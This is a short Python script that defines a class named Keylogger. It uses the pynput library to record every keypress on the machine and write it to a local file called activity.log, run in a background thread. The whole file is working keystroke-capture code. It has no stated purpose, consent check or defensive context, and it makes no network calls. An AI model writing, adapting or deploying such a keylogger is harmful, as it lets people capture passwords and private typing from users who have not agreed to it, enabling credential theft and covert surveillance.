import logging
from pynput import keyboard
import threading


class Keylogger:

    def __init__(self, name):
        self._name = name

    @property
    def name(self):

        return self._name

    @name.setter
    def name(self, new_name):
        self._name = new_name

    def start_logging(self):
        with keyboard.Listener(on_press=self._keydown_callback) as listener:
            listener.join()

    def _keydown_callback(self, key):
        try:
            logging.debug(f'{key.char}')
        except AttributeError:
            logging.debug(f'{key}') 


def run_keylogger():
    keylogger = Keylogger('SimpleKeylogger')
    keylogger.start_logging()


if __name__ == '__main__':

    logging.basicConfig(
        level=logging.DEBUG,
        filename='activity.log',
        format='Key: %(message)s',
    )
    
    keylogger_thread = threading.Thread(target=run_keylogger)
    keylogger_thread.start()
    keylogger_thread.join()
